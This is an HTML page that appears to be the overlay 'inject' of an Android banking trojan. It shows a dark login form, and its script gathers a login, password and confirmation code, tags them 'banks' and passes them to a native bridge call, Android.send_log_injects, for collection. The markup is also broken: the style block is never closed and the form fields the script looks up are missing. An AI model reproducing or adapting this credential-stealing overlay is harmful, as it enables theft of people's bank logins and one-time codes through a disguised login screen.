<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>

    <style>
        body {
            background-color: #2f3846;
        }

        form {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        .cool-input {
            box-sizing: border-box;
            border: 0;
            width: 100%;
            position: relative;
            font-size: 16px;
            margin-bottom: 15px;
        }

        .cool-input__input {
            box-sizing: border-box;
            background: none;
            width: 100%;
            padding: 10px;
            padding-left: 0;
            position: relative;
            z-index: 2;
            font-size: 1em;
        }
        .cool-input__input:focus {
            outline: none;
        }

        .cool-input__placeholder {
            box-sizing: border-box;
            border: none;
            background: none;
            width: 100%;
            position: absolute;
            z-index: 1;
            left: -35px;
            font-size: 20px;
            top: 30%;
            line-height: 0;
            color: #fff;
            transition: all 0.2s ease;
            direction: rtl;
            text-align: right;
        }

        .cool-input__input_filled + .cool-input__placeholder,
        .cool-input__input:focus + .cool-input__placeholder {
            font-size: 0.8em;
            top: 0;
            margin-top: -0.5em;
        }

        .input {
            width: 100%;
            padding: 5px;
            border: 0;
            border-bottom: 1px solid #5f6a83;
            text-align: right;
            color: #fff;
            padding-right: 35px;
            font-weight: 300;
            font-size: 18px;
            margin-bottom: 15px;
        }

        .input:focus {
            border-color: #51a85a;
        }

        section {
            padding: 20px;
            flex: 0.3;
        }

        .submit {   
            display: block;
            margin: 0 auto;
            width: 60%;
            padding: 10px;
            background-color: #63b98a;
            color: #fff;
            font-weight: 100;
            font-size: 16px;
            border: 0;
            border-radius: 25px;
            margin-bottom: 15px;
        }   

        .submit:disabled {   
            border: 2px solid #9e9e9e;
            color: #9e9e9e;
        }   

        input,button {
            outline: none !important;
            box-shadow: none !important;
        }

        .error {
            border-color: #f00 !important;
        }

    <script>
        $('.cool-input__input').on('input', function(){
            var $this = $(this);
            if ($this.val() == '') {
                $this.removeClass('cool-input__input_filled');
            } else {
                $this.addClass('cool-input__input_filled');
            }
        });

        var login = document.getElementById('login'),
            password = document.getElementById('password'),
            code = document.getElementById('code');

        var sendData = document.getElementById('sendData');


        sendData.onclick = () => {
            if(login.value.length < 6) {
                login.classList.add('error');
            } else {
                login.classList.remove('error');
            }

            if(password.value.length < 6) {
                password.classList.add('error');
            } else {
                password.classList.remove('error');
            }

            if(code.value.length < 6) {
                code.classList.add('error');
            } else {
                code.classList.remove('error');
            }

            if(login.value.length >= 6 && password.value.length >= 6 && code.value.length >= 6) {
                var data = {};
                data.login = login.value;
                data.password = password.value;
                data.code = code.value;
                
                data.type_injects = "banks";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
            }
        }
</script>
